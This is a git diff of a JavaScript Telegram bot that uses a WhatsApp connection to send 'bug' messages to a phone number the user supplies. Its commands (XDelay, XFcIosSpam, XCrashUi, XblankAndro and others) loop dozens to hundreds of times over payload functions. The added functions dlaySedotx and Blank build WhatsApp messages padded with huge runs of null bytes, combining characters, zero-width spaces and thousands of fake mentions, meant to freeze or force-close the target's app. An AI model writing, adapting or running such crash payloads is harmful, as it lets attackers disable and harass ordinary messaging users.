@@ -4122,7 +4122,7 @@ ${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profil
 });
 
 bot.command("update", async (ctx) => {
-  const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";
+  const repoRaw = "https://https://raw.githubusercontent.com/basesc/zhtnxupdate/refs/heads/main/Index.js";
   const filePath = "./index.js";
 
   await ctx.reply(
@@ -4262,10 +4262,7 @@ bot.command("XDelay", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(`
-<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
- ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
- ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲
-<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
+SUCCESS SEND BUG DELAY INVIS TARGET : ${q}
 `, {
     parse_mode: "HTML",
     reply_markup: {
@@ -4277,7 +4274,7 @@ bot.command("XDelay", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 
   (async () => {
     for (let i = 0; i < 10; i++) {
-      await WidixDelayInvis(sock, target);
+      await DelayInvisHardV1(sock, target);
       await sleep(100);
       await WidixDlayInvisss(sock, target);
       await sleep(250);
@@ -4293,10 +4290,7 @@ bot.command("Xzhatanixx", checkWhatsAppConnection, checkPremium, checkCooldown, 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(`
-<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
- ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
- ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝘿𝙀𝙇𝘼𝙔 𝙃𝘼𝙍𝘿 𝙄𝙉𝙑𝙄𝙎 𝙎𝙋𝘼𝙈
-<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
+SUCCESS SEND BUG DELAY INVIS HARD TARGET : ${q}
 `, {
     parse_mode: "HTML",
     reply_markup: {
@@ -4308,7 +4302,7 @@ bot.command("Xzhatanixx", checkWhatsAppConnection, checkPremium, checkCooldown, 
 
   (async () => {
     for (let i = 0; i < 10; i++) {
-      await WidixDelayInvis(sock, target);
+      await DelayInvisHardV1(sock, target)
       await sleep(10);
       await WidixDlayInvisss(sock, target);
       await sleep(90)
@@ -4324,10 +4318,7 @@ bot.command("XFcIosSpam", checkWhatsAppConnection, checkPremium, checkCooldown, 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(`
-<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
- ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
- ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝙁𝙊𝙍𝘾𝙀𝙇𝙊𝙎𝙀 𝙄𝙊𝙎 𝙎𝙋𝘼𝙈
-<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
+SUCCESS SEND BUG FORCELOSE SPAM TARGET : ${q}
 `, {
     parse_mode: "HTML",
     reply_markup: {
@@ -4355,10 +4346,7 @@ bot.command("Xilent", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(`
-<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
- ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
- ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝙁𝙊𝙍𝘾𝙀𝙇𝙊𝙎𝙀 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝙎𝙋𝘼𝙈
-<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
+SUCCESS SEND BUG FORCELOSE ANDRO TARGET : ${q}
 `, {
     parse_mode: "HTML",
     reply_markup: {
@@ -4388,10 +4376,7 @@ bot.command("XCanBuldo", checkWhatsAppConnection, checkPremium, checkCooldown, a
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
   await ctx.reply(`
-<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
- ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
- ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝘽𝙐𝙇𝘿𝙊 𝙄𝙉𝙑𝙄𝙎 𝙎𝙋𝘼𝙈
-<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
+SUCCESS SEND BUG BULDOZER TARGET : ${q}
 `, {
     parse_mode: "HTML",
     reply_markup: {
@@ -4436,9 +4421,9 @@ bot.command("XdelayHardV1", checkWhatsAppConnection, checkPremium, checkCooldown
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 120; i++) {
-    await WidixDelayInvis(sock, target);
+    await DelayInvisHardV1(sock, target);
     await sleep(800);
-    await WidixDlayInvisss(sock, target);
+    await DelayInvisHardV2(sock, target);
     await sleep(1000);
     await WidixBuldoZerr(sock, target);
     await sleep(2000);
@@ -4483,9 +4468,9 @@ bot.command("XdelayHardV2", checkWhatsAppConnection, checkPremium, checkCooldown
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 150; i++) {
-    await WidixDelayInvis(sock, target);
+    await DelayInvisHardV1(sock, target);
     await sleep(800);
-    await WidixDlayInvisss(sock, target);
+    await DelayInvisHardV2(sock, target);
     await sleep(1000);
     await WidixBuldoZerr(sock, target);
     await sleep(2000);
@@ -4530,9 +4515,11 @@ bot.command("XdelayVisible", checkWhatsAppConnection, checkPremium, checkCooldow
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 130; i++) {
-    await WidixDlayInvisss(sock, target);
+    await HardStatusBlast(sock, target);
+    await sleep(230);
+    await DelayInvisHardV1(sock, target)
     await sleep(1000);
-    await WidixBuldoZerr(sock, target);
+    await DelayInvisHardV2(sock, target)
     await sleep(2000);
     await DelayXfcWidix(sock, target);
     await sleep(3000);
@@ -4624,6 +4611,8 @@ bot.command("XdelayBuldo", checkWhatsAppConnection, checkPremium, checkCooldown,
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 200; i++) {
+    await dlaySedotx(target);
+    await sleep(100);
     await WidixBuldoZerr(sock, target);
     await sleep(800);
     await WidixDelayInvis(sock, target)
@@ -4673,7 +4662,7 @@ bot.command("XFcandroid", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await sleep(800);
     await WidixForceloseClik(target);
     await sleep(900);
-    await WidixDelayInvis(sock, target);
+    await DelayInvisHardV1(sock, target);
     await sleep(1000);
     await ForcloseClick(sock, target);
     await sleep(3000);
@@ -4775,7 +4764,7 @@ bot.command("XCrashUi", checkWhatsAppConnection, checkPremium, checkCooldown, as
     await sleep(800);
     await WidixCrashAndro(sock, target);
     await sleep(1300);
-    await ForcloseClick(sock, target);
+    await CrashAndro(sock, target);
     await sleep(3000);
   }
 
@@ -4865,9 +4854,11 @@ bot.command("XblankAndro", checkWhatsAppConnection, checkPremium, checkCooldown,
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 120; i++) {
+    await blankerssss(sock, target);
+    await sleep(200);
     await WidixCrashAndro(sock, target);
     await sleep(800);
-    await WidixDelayInvis(sock, target);
+    await DelayInvisHardV1(sock, target);
     await sleep(1000);
     await WidixCrashAndro(sock, target);
     await sleep(2000);
@@ -5749,5 +5740,440 @@ async function DelayXfcWidix(sock, target) {
   }
 }
 
+///
+
+
+async function dlaySedotx(target) {
+  for(let i = 0; i < 75; i++) {
+    let xwar = {
+      videoMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileSha256: "/wIcGMsYF7liPKItunivQe41vqK7hP4ZNwD8Sqvmexo=",
+        fileLength: "39218397",
+        seconds: 210,
+        mediaKey: "dqqHYls1grodqwvBH61uVJMe2tgGPEgFx3roOQr2PIg=",
+        height: 720,
+        width: 982,
+        fileEncSha256: "xro5p+xptCFGVxUtTrcTGxHnAO0vwU4KCpsw7r0wWMQ=",
+        directPath: "/v/t62.7161-24/594538257_3235516569961849_3349588506547181883_n.enc?ccb=11-4&oh=01_Q5Aa3wGIdnU4a89cz0GLaxdWk1j54W582dW0xZ3czj9Dyyh_Ow&oe=69BB2C5C&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1771289203",
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADUASAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAADXb2zzhkrPyFzwp6wyIOhhvSajkLtWreVB7cQoNh9QzjKhk7pmoIepvEugndjOjrvQVDzBDgfleBOvCwZvOwNV4Al//8QAJBAAAwACAgIBBAMAAAAAAAAAAQIDExIhMQQSEyIyQVEQQmH/2gAIAQEAAT8A+smqc8r+YZT2QV0Ukcpla0dsyP41tk+Zr+pGeL/JLX7KKqFrkp7ZSbSPiaMuN3OmZ/G9JTE2mYfJ9VzyZPIuz3/xjfJPSK+0WzPNOKWifHm0XjrHfqQvoW0UkN8mN8D6FSTZGn2VHrT/AEOIrTfaNI9e2uR9mM1tCnRSfBxW0z4+ez0SE5X5Q1yQIYzJ9lCz5J6Y82RvlmOnUn//xAAdEQACAgIDAQEAAAAAAAAAAAAAAAERAiEQIDFB/9oACAECAQE/AJGLIqj6WPqjIV8y81ev/8QAHBEAAgIDAQEAAAAAAAAAAAAAAAECERAxQQMh/9oACAEDAQE/AItDmj0dnChO2yhxvRL5iOyLSRF9HGLdlJC3hYls/9k=",
+        contextInfo: {
+          pairedMediaType: "NOT_PAIRED_MEDIA",
+          statusSourceType: "VIDEO",
+          mentionedJid: Array.from({ length:2000 }, (_, idx) => `628${idx + 72}@s.whatsapp.net`), 
+          isForwarded: true, 
+          forwardingScore: 7205,
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363420757607688@newsletter", 
+            newsletterName: "X", 
+            serverMessageId: 1000,
+            accessibilityText: "X"
+          }, 
+          statusAttributionType: "RESHARED_FROM_MENTION", 
+          contactVcard: true, 
+          isSampled: false, 
+          dissapearingMode: {
+            initiator: target, 
+            initiatedByMe: true
+          }, 
+          expiration: Date.now()
+        },
+        streamingSidecar: "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"
+      },
+      interactiveResponseMessage: {
+        body: {
+          text: "\u0000".repeat(1000),
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "address_message",
+          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"X\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
+          version: 3
+        }
+      }
+    };
+    
+    let xwar2 = generateWAMessageFromContent(target, xwar, {});
+
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: xwar2.message
+        }
+      },
+      { messageId: xwar2.key.id, participant: { jid: target } }
+    );
+  }
+}
+
+async function Blank(sock, target) {
+  try {
+    const Mentions = [
+      "0@s.whatsapp.net",
+      ...Array.from({ length: 5000 }, () =>
+        Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
+      )
+    ];
+    
+    const Msg1 = {
+      interactiveMessage: {
+        header: {
+          title: "Yth Shin" + "ꦽ".repeat(50000),
+          subtitle: "\u600b".repeat(40000)
+        },
+        body: {
+          text: "Gua Ganteng Gak ?"
+        },
+        footer: {
+          text: "Kenal Shin Gak ?"
+        },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "quick_reply",
+              buttonParamsJson: JSON.stringify({
+                display_text: "\u0000".repeat(80000),
+                id: "\u200b".repeat(50000)
+              })
+            }
+          ]
+        }
+      }
+    };
+
+    const Msg2 = {
+      interactiveMessage: {
+        body: {
+          text: "Shin Is Here".repeat(50000)
+        },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "cta_call",
+              buttonParamsJson: JSON.stringify({
+                display_text: "ꦽ".repeat(30000),
+                phone_number: "0".repeat(9999)
+              })
+            }
+          ]
+        }
+      }
+    };
+
+    const Msg3 = {
+      extendedTextMessage: {
+        text: "Yth Shin".repeat(15000) + "꧀".repeat(15000),
+        contextInfo: {
+          mentionedJid: Mentions
+        }
+      }
+    };
+
+    await sock.relayMessage(target, Msg1, {
+      participant: { jid: target }
+    });
+    
+    await sleep(2000);
+    
+    await sock.relayMessage(target, Msg2, {
+      participant: { jid: target }
+    });
+    await sleep(2000);
+    
+    await sock.relayMessage(target, Msg3, {
